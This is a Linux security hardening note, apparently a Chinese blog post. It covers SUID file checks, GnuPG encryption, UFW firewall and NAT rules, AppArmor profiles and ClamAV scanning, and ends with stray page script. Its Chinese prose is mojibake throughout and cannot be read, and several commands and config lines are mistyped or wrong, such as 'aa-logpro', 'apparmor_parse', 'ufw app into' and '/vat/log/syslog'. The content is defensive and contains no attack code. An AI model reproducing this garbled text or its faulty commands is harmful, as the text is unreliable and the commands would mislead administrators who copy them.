å¦‚æœsuidçš„å±ä¸»ä¸ºrootï¼Œé‚£ä»»ä½•äººéƒ½å¯ä»¥rootæƒé™æ‰§è¡Œå‘½ä»¤ï¼Œå±å®³å¤ªå¤§ # æ‰¾å¯ç”¨äº†suidçš„æ–‡ä»¶ sudo find / -type f -perm -u=s -ls # å¦‚æœæœ‰ä¸åº”è¯¥æœ‰suidæ–‡ä»¶ï¼Œéœ€è¦æ³¨æ„ # æ‰¾å¯ç”¨äº†guidçš„æ–‡ä»¶ sudo find / -type f -perm -g=s -ls # å¦‚æœå‘˜å·¥ç¦»èŒï¼Œé‚£å‘˜å·¥çš„è´¦æˆ·æ²¡è¢«æ¸…ç†ï¼Œè¢«æ–°äººæ‰€æ²¿ç”¨ï¼Œå°±å¯ä»¥è¯»å–ä¹‹å‰çš„æ–‡ä»¶-->å› ä¸ºç³»ç»Ÿé uidè¯†åˆ« # æ£€æŸ¥æ— å±ä¸»å’Œæ— å±ç»„çš„ï¼Œæ ¹æ®éœ€è¦ä¿å­˜å’Œæ¸…ç†(å¦‚ï¼šç¦»èŒå‘˜å·¥å¸å·è¢«åˆ é™¤ï¼Œçš„æ–‡ä»¶) find -xdev \(-nouser -o nogroup \) -print # é¢˜å¤–è¯ï¼š å½“tå‡ºç°åœ¨å…¶ä»–ç»„çš„xæƒé™ä½ç½®æ—¶ï¼Œè¡¨ç¤ºå…¶ä»–ç»„å…·æœ‰SBITçš„æƒé™ã€‚ SBITï¼ˆSticky Bitï¼‰ç›®å‰åªé’ˆå¯¹ç›®å½•æœ‰æ•ˆï¼Œå¯¹äºç›®å½•çš„ä½œç”¨æ˜¯ï¼šå½“ç”¨æˆ·åœ¨è¯¥ç›®å½•ä¸‹å»ºç«‹æ–‡ä»¶æˆ–ç›®å½•æ—¶ï¼Œä»…æœ‰è‡ªå·±ä¸ rootæ‰æœ‰æƒåŠ›åˆ é™¤ã€‚ æœ€å…·æœ‰ä»£è¡¨çš„å°±æ˜¯/tmpç›®å½•ï¼Œä»»ä½•äººéƒ½å¯ä»¥åœ¨/tmpå†…å¢åŠ ã€ä¿®æ”¹æ–‡ä»¶ï¼ˆå› ä¸ºæƒé™å…¨æ˜¯rwxï¼‰ï¼Œä½†ä»…æœ‰è¯¥æ–‡ä»¶/ç›®å½•å»ºç«‹è€…ä¸ rootèƒ½å¤Ÿåˆ é™¤è‡ªå·±çš„ç›®å½•æˆ–æ–‡ä»¶ã€‚ æ–‡ä»¶åŠ å¯†ç½‘ç»œæœ¬èº«ä¸åŠ å¯† é€šè¿‡ä¸å—ä¿¡ç½‘ç»œè¿æ¥ä¸Šç½‘ åŠ å¯†ä¿¡æ¯ä¼ è¾“é€šé“æ˜¯é¦–é€‰æ–¹æ¡ˆ(VPN) ä¼ è¾“å•ä¸ªæ–‡ä»¶å¯ä½¿ç”¨æ–‡ä»¶çº§åŠ å¯† å¾ˆå¤šåº”ç”¨ä¹Ÿä¸åŠ å¯†ä¼ è¾“æœºå¯†ä¿¡æ¯ä½¿ç”¨SSHã€SCP GnuPG # åŸºäºæ–‡ä»¶çš„åŠ å¯†ã€‚å…è´¹å¼€æº # Linuxé»˜è®¤å®‰è£… # æ–¯è¯ºç™»æ¨è ### ä½¿ç”¨ # 1.ç”Ÿæˆå¯†é’¥å¯¹(å…¬é’¥ï¼Œç§é’¥)ï¼Œå‘é€æ–¹å’Œæ¥æ”¶æ–¹éƒ½è¦ç”Ÿæˆ gpg --gen-key #è¾“å…¥name,email,å¯†ç æ–‡(ä¿æŠ¤å¯†é’¥) #ä¼šè‡ªåŠ¨è¿›è¡Œç³»ç»Ÿä¿¡æ¯æœé›†ç”Ÿæˆéšæœºæ•°æ®(è¶Šéšæœºè¶Šå®‰å…¨ï¼Œå¦‚æœåŠå¤©æ²¡å“åº”ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤) #ç”Ÿæˆéšæœºæ“ä½œ ç†µ(ä¿ƒä½¿) sudo find / -type f|xargs grep somerandomstring> /dev/null # 2.å…¬é’¥äº¤æ¢:æ¥æ”¶è€…å…ˆæŠŠå…¬é’¥å‘ç»™å‘é€è€…(è¿™é‡Œä½¿ç”¨åŸå§‹çš„æ–¹å¼) #2.1 æ¥æ”¶è€…å¯¼å‡ºå…¬é’¥æ–‡ä»¶ gpg --export user2_name > user2_name.pub #2.2 å…¬é’¥æ–‡ä»¶æ‹·è´ç»™å‘é€è€… scp mygpg.pub xps1@192.168.0.11:~/ # 3.å‘é€è€…æ‰§è¡Œ #3.1æŸ¥çœ‹å½“å‰éƒ½æœ‰å“ªäº›å¯†é’¥ gpg --list-keys #3.2å‘é€è€…å¯¼å…¥æ¥æ”¶è€…çš„å…¬é’¥ gpg --import user2_name.pub #æŸ¥çœ‹å½“å‰éƒ½æœ‰å“ªäº›å¯†é’¥ gpg --list-keys # 4.å‘é€è€…å¼€å§‹åŠ å¯†æ–‡ä»¶ï¼ˆ-recipient æ˜¯æ¥æ”¶è€…çš„åå­—ï¼‰ gpg --encrypt --recipient zhangsan secert.txt # secert.txtæ˜¯è¦åŠ å¯†çš„æ–‡ä»¶ #5.åŠ å¯†æ–‡ä»¶å‘é€ç»™æ¥æ”¶è€… #æ¥æ”¶è€…è§£å¯†(ä½¿ç”¨ç§é’¥) gpg --output result.txt --decrypt secret.txt.gpg #è¾“å…¥ç§é’¥çš„åŠ å¯†å¯†ç ä¸² ## å…¶ä»–å‘½ä»¤ #æŸ¥çœ‹å½“å‰éƒ½æœ‰å“ªäº›å¯†é’¥ gpg --list-keys #åˆ é™¤æŸäººçš„å…¬é’¥ gpg --delete-keys zhangsan #åˆ é™¤è‡ªå·±çš„ç§é’¥ gpg --delete-secret-keys xps ## é€šè¿‡å¯†é’¥æœåŠ¡å™¨äº¤æ¢å¯†é’¥(æŒ‡å®šå¯†é’¥æœåŠ¡å™¨ï¼Œ åé¢16è¿›åˆ¶0x---æ˜¯idå€¼çš„å8ä½) gpg --keyserver certserver.pgp.com --send-key 0xAABBCCDD # æˆ‘å‘é€ gpg --keyserver certserver.pgp.com --recv-key 0xAABBCCDD # å¯¹æ–¹è·å– #ä½†æ˜¯è¿™ç§æ–¹å¼åœ¨å›½å†…å—é™ GnuPGå¤§è‡´å·¥ä½œæµç¨‹ï¼š é˜²ç«å¢™ è®¿é—®æ§åˆ¶è®¾å¤‡ Linuxå†…æ ¸åŒ…å«Netfilterå­ç³»ç»Ÿ ç”¨äºæ“ä½œç»è¿‡æœåŠ¡å™¨çš„æµé‡ å®ç°åŒ…ç®¡ç† ç”¨æˆ·ç©ºé—´ç®¡ç†å·¥å…·iptables(åŠŸèƒ½å¼ºå¤§ï¼Œä½†æ˜¯å‘½ä»¤æ¯”è¾ƒå¤æ‚) Ubuntué»˜è®¤çš„é˜²ç«å¢™ç®¡ç†å·¥å…·UFW æ“ä½œç®€å•ï¼Œé»˜è®¤ç¦ç”¨ åŠŸèƒ½ä¸å…¨é¢ ä¸»è¦ç”¨ä½œä¸»æœºé˜²ç«å¢™(æœ¬èº«å°±æ˜¯ç›®æ ‡ï¼Œå¯¹è‡ªå·±åŠ é˜²æŠ¤) UFW é€‚åˆåšä¸»æœºé˜²ç«å¢™ï¼Œå¦‚æœåšç½‘ç»œé˜²ç«å¢™ä¸æ˜¯å¾ˆå¥½ åŸºæœ¬ä½¿ç”¨å¯ç”¨ sudo ufw enable # æ³¨æ„ï¼šä¼šæœ‰æç¤º:"å¯èƒ½ä¼šå¯¼è‡´ç°æœ‰çš„è¿æ¥æ–­å¼€,æ¯”å¦‚22"-->æœ‰é»˜è®¤ç­–ç•¥ sudo ufw disable æŸ¥çœ‹çŠ¶æ€ # è§„åˆ™çš„é¡ºåºå¾ˆé‡è¦(å¦‚æœä¸­é—´åŒ¹é…äº†ï¼Œå°±ä¸å¾€ä¸‹åŒ¹é…è§„åˆ™äº†) sudo ufw status sudo ufw status verbose # è¯¦ç»†å±•ç¤º: Logging: on (low)æ—¥å¿—è¯¦ç»†çº§åˆ« Default: allow (incoming), allow (outgoing), deny (routed) -->å…¥ç«™çš„é»˜è®¤å…è®¸ï¼Œå‡ºæˆ˜çš„é»˜è®¤ç¦æ­¢ï¼Œè‹¥ä½œä¸ºç½‘ç»œé˜²ç«å¢™(è·¯ç”±)é»˜è®¤æ˜¯ç¦ç”¨çš„ sudo ufw status numbered # åˆ—å‡ºåºå· é»˜è®¤è§„åˆ™ sudo ufw default allow|deny|reject DIRECTION(incoming/outigoing/routed) ## ä¸¤ä¸ªæ‹’ç»çš„åŒºåˆ« # deny æ— è§†ï¼Œä¹Ÿæ²¡æœ‰å“åº”ï¼Œä¸å‘Šè¯‰å‘èµ·è€…(æ¨èè¿™ä¸ªï¼Œæ›´å®‰å…¨ï¼Œé˜²æ‰«æ) # reject ä¼šç»™å‘èµ·è€…ä¸€ä¸ªå“åº”ï¼Œå‘Šè¯‰ä»– æ·»åŠ ç­–ç•¥æ·»åŠ è§„åˆ™ sudo ufw allow 22 # ä¸æŒ‡å®šåè®®ç±»å‹æ—¶ï¼Œctpå’Œudpéƒ½å¼€ sudo ufw allow 22/tcp # æœ€å°åŒ–åŸåˆ™ï¼Œåªå¼€tcpçš„22 sudo ufw deny 22 # ipv4çš„é»˜è®¤åœ¨ä¸Šé¢, ipv6çš„é»˜è®¤åœ¨ä¸‹é¢ è®¾ç½®æ–¹å‘(in ,out) sudo ufw allow in http # é»˜è®¤è®¾ç½®å…¥ç«™è§„åˆ™ sudo ufw reject out smtp è§„åˆ™æè¿° # è§„åˆ™å¤ªå¤šäº†è®°ä¸æ¸… sudo ufw reject telnet comment 'telnet is unencrypted' # ä»¥åä¸ç”¨çš„è§„åˆ™å°±å¯ä»¥æ–¹é¢æ¸…ç†åˆ é™¤ï¼ˆå®‰å…¨ç®¡ç†æ„è¯†å¾ˆé‡è¦ --> è¯¦ç»†æ–‡æ¡£å¾ˆé‡è¦ï¼Œç»Ÿä¸€ç®¡ç†å¹³å°:å·¥å•ï¼‰ æ’å…¥è§„åˆ™ # æŒ‡å®šæ–°è§„åˆ™çš„ä½ç½®æ˜¯2ï¼Œåé¢çš„å‘åé¡ºå»¶ sudo ufw insert 2 allow 80 åˆ é™¤è§„åˆ™ # æŒ‰ç…§idåºå·åˆ é™¤ sudo ufw delete 3 # æŒ‰ç…§ æ·»åŠ æ—¶å€™çš„è§„åˆ™åˆ é™¤ sudo ufw delete allow http å®šå‘è§„åˆ™ # 5ä¸ªï¼šæºipï¼Œç›®çš„ipï¼Œæºç«¯å£(å¾ˆå°‘åšé™åˆ¶)ï¼Œç›®çš„ç«¯å£ï¼Œé€šä¿¡åè®® # åœ¨2çš„ä½ç½®æ’å…¥ï¼Œå…è®¸ protoåè®®ä¸ºtcpï¼Œä»1.1.1.10æ¥çš„åˆ°1.1.1.9çš„22ç«¯å£ sudo ufw insert 2 allow proto tcp from 1.1.1.10 to any port 22 sudo ufw insert 2 allow proto tcp from 1.1.1.10 to 1.1.1.9 port 22 sudo ufw insert 2 allow proto tcp from 192.168.0.0/24 to any port 22 # ä½¿ç”¨äºåªå…è®¸å…¬å¸å†…éƒ¨è®¿é—® sudo ufw insert 2 allow proto tcp from 192.168.0.0/24 to 192.168.0.102 port 22 sudo ufw deny proto tcp from 2001:db8::/32 to any port 25 # IPv6 # /etc/default/ufw å¯ç”¨/ç¦ç”¨IPv6è§„åˆ™(IPV6=YES) # å…¶ä»–åè®®ï¼šah, esp, gre, ipv6, igmp ç«¯å£å # å‰é¢ http ç­‰æ˜¯ä¸ç«¯å£å¯¹åº”çš„ï¼Œä¸æ˜¯éšä¾¿èµ·çš„ï¼Œé…ç½®æ–‡ä»¶å¦‚ä¸‹ /etc/services # å¯ä»¥è‡ªå®šä¹‰ è§„åˆ™ sudo ufw deny in on eth0 to 224.0.0. proto igmp # æŒ‡å®šç½‘å¡ï¼ˆæ‹’ç»eth0å…¥çš„æ–¹å‘ä½¿ç”¨igmpåè®®è®¿é—®ç»„æ’­åœ°å€ï¼‰ sudo ufw allow in on eth0 to 224.0.0. proto gre sudo ufw allow proto tcp from any to any port 80,443,8080:8090 comment 'web' # ä¸€æ®µç«¯å£èŒƒå›´->ç”¨å†’å· sudo ufw allow in on eth0 to any port 80 proto tcp å¼€å¯è·¯ç”±æ¨¡å¼ # å¯ç”¨è·¯ç”±åŠŸèƒ½ sudo vi /etc/ufw/sysctl.conf netipv4/ip_forward=1 net/ipv6/conf/default/forwarding=1 net/ipv6/conf/all/forwarding=1 # sudo sysctl -p ufw disable ufw enable è·¯ç”±æ¨¡å¼è§„åˆ™ # å¯ç”¨è·¯ç”±åŠŸèƒ½(è½¬å‘æ•°æ®åŒ…)ï¼Œå…ˆæ·»åŠ è§„åˆ™å†å¼€å¯è·¯ç”±ä¹Ÿå¯ # 7ä¸ªï¼šæºç½‘å¡æ¥å£ï¼Œç›®çš„ç½‘å¡æ¥å£ï¼Œæºipï¼Œç›®çš„ipï¼Œæºç«¯å£(å¾ˆå°‘åšé™åˆ¶)ï¼Œç›®çš„ç«¯å£ï¼Œé€šä¿¡åè®® sudo ufw route allow in on eth1 out on eth2 # eth1ç½‘å¡inçš„æµé‡ï¼Œ eth2å‡ºçš„æµé‡ sudo ufw route allow in on eth1 out on eth2 to 192.167.11 port 80 proto tcp é™åˆ¶è¿æ¥é¢‘ç‡ # å°½é‡è§„é¿æš´åŠ›ç ´è§£ ufw limit ssh/tcp # 30sè¶…è¿‡6æ¬¡å°±deny å®‰å…¨ç›¸å…³UFWä½œä¸ºç½‘ç»œé˜²ç«å¢™(å…ˆå¼€å¯è·¯ç”±è½¬å‘) IPé®ç›– # sudo vi /etc/default/ufw DEFAULT_FORWARD_POLICY="ACCEPT" # sudo vi /etc/ufw/sysctl.conf net/ipv4/ip_forward=1 # å¯ç”¨è·¯ç”±åŠŸèƒ½ # sudo vi /etc/ufw/before.rules *nat # å¼€å¯natåœ°å€è½¬æ¢ ï¼šPOSTROUTING ACCEPT [0:0] # æ¥æ”¶è·¯ç”±è½¬å‘ -A POSTROUTING -s 10.8.0.0/8 -o enp0s3 -j MASQUERADE # æ·»åŠ è§„åˆ™ï¼šåˆ¶å®šæ¥æºå†…ç½‘ç½‘æ®µï¼ŒæŒ‡å®šå¦ä¸€ä¸ªæœ‰å…¬ç½‘ipçš„çš„ç½‘å¡ç„¶åè¿›è¡Œåœ°å€è½¬æ¢å¹¶å‘å‡ºå» COMMIT # å®Œæ•´è¯­æ³•è§„åˆ™ sudo ufw route allow/reject/deny/limit insert/delete/pretend in on eth0 out on eth1 from 1.1.1.1 oport 1:65535 to 2.2.2.2 port 22 proto tcp/udp/igmp/esp/ah # å¦‚æœä¸æŒ‡å®šè§„åˆ™idä½ç½®ï¼Œå°±é»˜è®¤åœ¨åé¢ä¾æ¬¡ï¼›pretendæ˜¯ä¾æ¬¡ä»å‰é¢æ·»åŠ  å°æŠ€å·§ â€“ åº”ç”¨ç¨‹åº # ä¸ºéæ ‡å‡†ç«¯å£çš„åº”ç”¨å®šä¹‰åç§° # ä¸ºæ¯ä¸ªå¼€æ”¾ç«¯å£çš„æœåŠ¡ç¨‹åºåˆ†åˆ«å®šä¹‰ç¨‹åºé…ç½®æ–‡ä»¶ /etc/ufw/applications.d/ sudo ufw allow from 192.168.0.0/24 to any app CUPS sudo ufw app into CUPS [&lt;name>] title=&lt;title> description=&lt;description> portd=&lt;ports> ports=12/udp|32|56,78:90/tcp # ç«–çº¿éš”å¼€ # åº”ç”¨é˜²ç«å¢™è§„åˆ™ sudo ufw app update &lt;name> # é€‚ç”¨æƒ…æ™¯ï¼š éæ ‡å‡†ä¸šåŠ¡çš„æœåŠ¡ç«¯å£ï¼Œä¸€ä¸ªåº”ç”¨åŒæ—¶ç»‘å®šå¤šä¸ªç«¯å£ï¼Œä¸šåŠ¡æè¿°ä¹Ÿå¯ä»¥æ·»åŠ è¿›å»ï¼Œä¿®æ”¹ä¹Ÿæ–¹ä¾¿ æ—¥å¿—åŠŸèƒ½ UFWé»˜è®¤ä¸è®°å½•æ—¥å¿—ï¼Œå› ä¸ºå ç”¨å­˜å‚¨ç©ºé—´ æ—¥å¿—çš„ä»·å€¼åœ¨äºï¼šè¯†åˆ«æ”»å‡»ã€è§„åˆ™æ’é”™ã€è¯Šæ–­é—®é¢˜ # å…¨å±€å¼€å¯æ—¥å¿—ï¼Œä»¥åŠçº§åˆ« / å…³é—­æ—¥å¿— sudo ufw logging on|off|LEVEL(LOW/medium/high/full) # å­˜å‚¨ä½ç½®ï¼š/var/log/ufw.log # å•ç‹¬ä¸ºæ¯æ¡è§„åˆ™æ·»åŠ æ—¥å¿— sudo ufw allow log 22/tcp æ¢å¤é»˜è®¤è§„åˆ™# ç³»ç»Ÿå…¨æ–°å®‰è£…çš„çŠ¶æ€(å®åœ¨æä¸æ¸…æ‰ä½¿ç”¨ï¼Œä¼šæå‰å¤‡ä»½->/etc/ufw/æ—¥æœŸå‘½åçš„æ–‡ä»¶) sudo ufw reset Shorewallé€‚åˆä»»ä½•ç½‘ç»œçš„é«˜çº§é˜²ç«å¢™æœ‰å›¾å½¢ç®¡ç†ç•Œé¢ å› ä¸ºiptablesè¯­æ³•æœ‰ç‚¹éº»çƒ¦ï¼Œä¸æƒ³ä½¿ç”¨ AppArmorç®€ä»‹AppArmoræ˜¯ä¸€ä¸ªLinuxå®‰å…¨æ¨¡å— ä½¿ä¸å®‰å…¨å’Œä¸å—ä¿¡è¿›ç¨‹åœ¨å—é™çš„çº¦æŸä¸‹è¿è¡Œ ä¿è¯è¿›ç¨‹è®¿é—®å…±äº«æ–‡ä»¶ã€è¡Œä½¿ç‰¹æƒã€ä¸å…¶ä»–è¿›ç¨‹é€šä¿¡ é’ˆå¯¹æŸä¸€ä¸ªè¿›ç¨‹å±‚é¢ ç•Œé¢ç¾è§‚ï¼Œæ“ä½œè¾ƒç®€å• å…¨å±€å¼ºåˆ¶è®¿é—®æ§åˆ¶æœºåˆ¶(MAC) åŸºäºLSMçš„é¢å¤–å®‰å…¨åŠŸèƒ½ ç³»ç»Ÿè°ƒç”¨å‰ï¼Œå†…æ ¸æŸ¥è¯¢AppArmorç­–ç•¥ï¼Œç¡®å®šç¨‹åºæ˜¯å¦æœ‰æƒæ‰§è¡Œæ“ä½œ ä¸åŒä¸SELinux(è¿‡äºåºå¤§, é’ˆå¯¹æ“ä½œç³»ç»Ÿå±‚é¢)ï¼Œä¸ç”¨æˆ·æ— å…³ï¼Œå¯ç”¨äºé™åˆ¶è¶…çº§ç”¨æˆ·æƒé™ï¼ˆæ‰€æœ‰ç”¨æˆ·ç»§æ‰¿ï¼‰ å°†è¿›ç¨‹é™åˆ¶åœ¨æœ‰é™çš„ç³»ç»Ÿèµ„æºä¹‹ä¸Š é¢„è®¾çš„æ§åˆ¶æœºåˆ¶ï¼Œä¸€å®šç¨‹åº¦å¯é¢„é˜²æœªçŸ¥å®‰å…¨æ¼æ´ï¼ˆ0dayï¼‰ Ubuntué»˜è®¤çš„å®‰å…¨ç³»ç»Ÿé»˜è®¤å·²å®‰è£…å¹¶åŠ è½½ æ§åˆ¶ç­–ç•¥ åŸºäºå®‰è£…è·¯å¾„è¯†åˆ«ç¨‹åºå¹¶æ§åˆ¶ ç­–ç•¥ä¿å­˜äºç›¸åº”é…ç½®æ–‡ä»¶(profile)ä¸­ é›†åˆé«˜çº§é™æ€åˆ†æå’ŒåŸºäºæ–‡ä»¶/etc/apparmor.d éƒ¨åˆ†å®‰è£…åŒ…è‡ªå¸¦é…ç½®æ–‡ä»¶ ä½¿ç”¨å®‰è£…é¢å¤–é…ç½®æ–‡ä»¶ sudo apt install apparmor-profiles apparmor-profiles-extra # apparmor-profiles # ç”±ä¸Šæ¸¸ç¤¾åŒºç®¡ç†ç»´æŠ¤çš„é…ç½®æ–‡ä»¶ # apparmor-profiles-extra # ç”±ubuntuã€debianå¼€å‘çš„é…ç½®æ–‡ä»¶ å®‰è£…ç”¨æˆ·ç«¯ç®¡ç†å·¥å…· sudo apt install apparmor-utils æŸ¥çœ‹çŠ¶æ€ sudo aa-status æ§åˆ¶æ¨¡å¼ # enforcing å¼ºåˆ¶ç­–ç•¥å®æ–½å¹¶è®°å½•è¢«ç¦ç”¨è¯·æ±‚ # complaining åªè®°å½•è¢«ç¦è¯·æ±‚ï¼Œä½†ä¸å¼ºåˆ¶å®æ–½ç¦æ­¢ -->ç­–ç•¥è°ƒè¯•æ—¶å€™ç”¨ ## åˆ‡æ¢æ¨¡å¼ aa-enforce # åˆ‡æ¢ä¸ºå¼ºåˆ¶æ¨¡å¼ aa-complain # åˆ‡æ¢ä¸ºåŒ…å®¹æ¨¡å¼ aa-disable # ç¦ç”¨æŒ‡å®špofile(ä¸å¯¹è¿™ä¸ªç¨‹åºåšé™åˆ¶ï¼Œä¸loaded) aa-audit # å®¡è®¡æ¨¡å¼ï¼Œ= enforce + è®°å½•æˆåŠŸè®¿é—®çš„è¯·æ±‚(å¹¶ä¸æ˜¯å¾ˆå¸¸è§) å½“å‰å·²ç»åŠ è½½çš„é…ç½®æ–‡ä»¶ /sys/kernel/security/apparmor/profiles é…ç½®æ–‡ä»¶å‘½ä»¤ ä¸å¯æ‰§è¡Œç¨‹åºç»“å¯¹è·¯å¾„ç›¸åŒï¼Œ/ -&gt; . è½¯è¿æ¥å°†æœ€ç»ˆè§£æåˆ°ç›®æ ‡ç¨‹åº é»˜è®¤é…ç½®æ–‡ä»¶å®‰è£…åŒ…æºå¸¦å¹¶æœ‰æ•ˆï¼ˆbind9, mysql â€¦ï¼‰å®‰è£…åŒ…æºå¸¦ä½†ä¸ºç©ºï¼ˆmariadbï¼‰å®‰è£…åŒ…æ— é…ç½®æ–‡ä»¶ï¼Œé¢å¤–åŒ…æ•…éšœï¼ˆsambaï¼‰ sambaä¸ºä¾‹1.å®‰è£…sambaæœåŠ¡ # sudo apt install samba samba-common apparmor-profiles sudo aa-status #/etc/apparmor.d/usr.sbin.smbd # nmbdæœåŠ¡ä¹Ÿå¯ä»¥ 2.å¯ç”¨å¼ºåˆ¶ç­–ç•¥ sudo aa-enforce /usr/sbin/smbd # å¯¹smbdè¿›è¡Œç­–ç•¥é™åˆ¶ sudo aa-status 3.é‡å¯æœåŠ¡ sudo systemctl restart smbd # ä¼šå‘ç°æŠ¥é”™æ— æ³•å¯åŠ¨æœåŠ¡(å› ä¸ºé…ç½®æ–‡ä»¶æœ‰é—®é¢˜) tail /vat/log/syslog # æŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—ï¼Œå‘ç° apparmor="DENIED"ï¼Œ å»ºè®®ï¼šä»ç¬¬ä¸€ä¸ªDENIEDå¼€å§‹å¾€ä¸‹çœ‹,ä¸€æ¬¡ä¿®æ”¹ä¸€æ¡ 4.ä¿®æ­£é…ç½®æ–‡ä»¶ sudo vi /etc/apparmor.d/usr.sbin.smbd ## è¿™é‡Œæ ¹æ®æ—¥å¿—DENIEDçš„å†…å®¹æ¥å†™ï¼ˆæ¯ä¸€è¡Œéƒ½æœ‰é€—å·ï¼‰ /var/run/smbd rw, # pathè·¯å¾„é¡¹æƒé™ æ ¹æ®è‡ªå·±çš„å†™... capability net_admin, # capabilityè¿›ç¨‹æƒé™ # é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶ sudo apparmor_parser -r usr.sbin.smbd # é‡æ–°åŠ è½½æ‰€æœ‰é…ç½®æ–‡ä»¶ sudo systemctl reload apparmor.service # ç„¶åé‡å¯æœåŠ¡ï¼ŒæŸ¥çœ‹èƒ½ä¸èƒ½èµ·æ¥ï¼Œå¦‚æœä¸èƒ½èµ·æ¥->ç»§ç»­æŸ¥çœ‹æ—¥å¿—å’Œä¿®æ”¹é…ç½®çš„æ­¥éª¤ sudo systemctl restart smbd sudo systemctl status smbd ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ ä»å¤´å¼€å§‹åˆ›å»ºæ–°çš„é…ç½®æ–‡ä»¶ä¸å»ºè®®å¯¹æ‰€æœ‰ç¨‹åºéƒ½åšé™åˆ¶ï¼Œä¸»è¦é¢å‘å¯¹å¤–/æ¥æ”¶æä¾›ç½‘ç»œæœåŠ¡ç›¸å…³çš„ç¨‹åº(apache, samba, æµè§ˆå™¨ç­‰ç­‰å®¹æ˜“é­å—æ”»å‡»çš„) # æŸ¥çœ‹è¿›äº†è¡Œç½‘ç»œè¯·æ±‚ï¼Œä½†æ˜¯æ²¡æœ‰apparmoré…ç½®æ–‡ä»¶å¯¹å…¶è¿›è¡Œä¿æŠ¤çš„ç¨‹åº sudo aa-unconfined sudo aa-unconfined --paranoid # æ‰€æœ‰å…³è”ç½‘ç»œç«¯å£çš„è¿›ç¨‹ # è¿™é‡Œæ‹¿mträ½œä¸ºä¾‹å­ aa-genprof mtr # æŒ‡å®šå¯¹ä»€ä¹ˆç¨‹åºè¿›è¡Œé…ç½® mtr www.baidu.com # è¿è¡Œç¤ºä¾‹ç¨‹åº # ç»§ç»­æŒ‰ç…§æç¤ºé€‰æ‹© # sudo apparmor_parse -r usr.bin.mtr sudo aa-logpro # æ£€æŸ¥æ—¥å¿—æ›´æ–°é…ç½®æ–‡ä»¶ é˜²ç—…æ¯’ æ¶æ„è½¯ä»¶ç—…æ¯’ã€æœ¨é©¬ã€è •è™«ã€è¿œæ§ã€åƒµå°¸ç¨‹åºã€å‹’ç´¢ã€æŒ–çŸ¿ã€æ¼æ´åˆ©ç”¨ é€šå¸¸é˜²ç—…æ¯’å’ŒLinuxä¸ä¼šå‡ºç°åœ¨åŒä¸€å¥è¯é‡Œï¼ŒBUTï¼ ä¸“é—¨é’ˆå¯¹Liunxå‘è¡Œç‰ˆçš„æ¶æ„è½¯ä»¶ æ²¡æœ‰100%æœ‰æ•ˆçš„å•ä¸ªæ€æ¯’è½¯ä»¶ï¼ˆç—…æ¯’åº“äº’è¡¥ï¼‰ ClamAV: å¼€æºå…è´¹å…¨å¹³å° ClamAV1.å®‰è£… sudo apt install clamav clamav-daemon # å¦‚æœåªå®‰è£…clamavï¼Œå°±ä¸åšè‡ªåŠ¨ç›‘æ§ï¼›clamav-daemon è‡ªåŠ¨æŸ¥æ€ sudo apt install install libclamunrar6 # å¯¹å‹ç¼©åŒ…ä¹ŸæŸ¥æ€ç—…æ¯’ # æœ‰æ¡Œé¢ç¯å¢ƒçš„è¯ï¼Œå¯ä»¥å®‰è£…å®¢æˆ·ç«¯å›¾å½¢ç®¡ç†å·¥å…· 2.æ›´æ–°ç—…æ¯’åº“ sudo systemctl stop clamav-freshclam # sudo freshclam # ä¼šæŠ¥é”™(å› ä¸ºä»–å·²ç»è‡ªåŠ¨æ›´æ–°äº†)ï¼Œå¯ä»¥å…ˆåœæ­¢æ‰(ä¸Šé¢)ï¼Œå†æ‰‹åŠ¨ã€‚ä¹Ÿå¯ä»¥ç­‰å¾…ä»–æ›´æ–°å®Œ less /var/log/clamav/freshclam.log # å¯ä»¥æŸ¥çœ‹æ—¥å¿—è®°å½• ä»£ç† sudo vi /etc/clamav/freshclam.conf HTTPProxyServer server_address HTTPPrpxyPort port_number å›¾å½¢åŒ–å‰ç«¯å·¥å…· clamtk 3.æ‰‹åŠ¨æ‰«æ # æ‰«æä¼šå ç”¨ç³»ç»Ÿèµ„æºï¼Œæ‰€ä»¥é€‰æ‹©ä¸šåŠ¡ä¸æ˜¯ç¹å¿™çš„æ—¶é—´æ¥æŸ¥æ€ # æ‰‹åŠ¨æ‰«æçš„å½“å‰ç”¨æˆ·èƒ½æ‰«æçš„ä½ç½® clamscan /home/xps -i -r # -ré€’å½’ï¼Œ -iæ˜¾ç¤º # --max-filesize é™åˆ¶å¤§å°(è¶…è¿‡å¤§å°å°±ä¸ä¼šæ‰«å®ƒ)ï¼Œ --max-scansizeæœ€å¤§æ‰«å¤šå°‘(æ¯”å¦‚ä¸€ä¸ªæ–‡ä»¶æˆ‘åªæ‰«å¤šå°‘)ï¼Œ --exclude-diræ’é™¤ç›®å½• sudo clamscan --max-filesize=3999M --max-scansize=3999M --exclude-dir=/sys/* -i -r /home # é»˜è®¤ä¸å…·æœ‰æ€æ¯’èƒ½åŠ›ï¼Œåªæ˜¯æ£€æµ‹ # --remove æŸ¥åˆ°æ„ŸæŸ“çš„æ–‡ä»¶ï¼Œåˆ é™¤ # --bell æŸ¥åˆ°æ„ŸæŸ“çš„æ–‡ä»¶ï¼Œå˜Ÿå˜Ÿå˜Ÿæé†’ # move=/tmp/VIRUS æŸ¥åˆ°æ„ŸæŸ“çš„æ–‡ä»¶ï¼Œç§»åŠ¨åˆ°æŸä¸ªä½ç½® # copy=/tmp/VIRUS æµ‹è¯• wget http://www.eicar.org/download/eicar.com # æµ‹è¯•ç—…æ¯’æ–‡ä»¶,å«æ¯’ï¼Œä½†æ˜¯æ²¡ç ´åä½œç”¨ clamscan -i -r ./ 4.æ‰«æè°ƒåº¦(å®šæ—¶ä»»åŠ¡) â€“ é˜²æ­¢è¯¯æ€(ç®¡ç†å‘˜è¦æå‰åšå¥½ç®¡ç†å¤‡ä»½æˆ–è€…å®æ—¶ç›‘è§†) at 13:00 tomorrow clamscan -i -r /home/xps freshclam &lt;EOF> &lt;CTRL-D> # æˆ–è€…å…¶ä»–è°ƒåº¦å‘½ä»¤ crontab document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>UFW</tag>
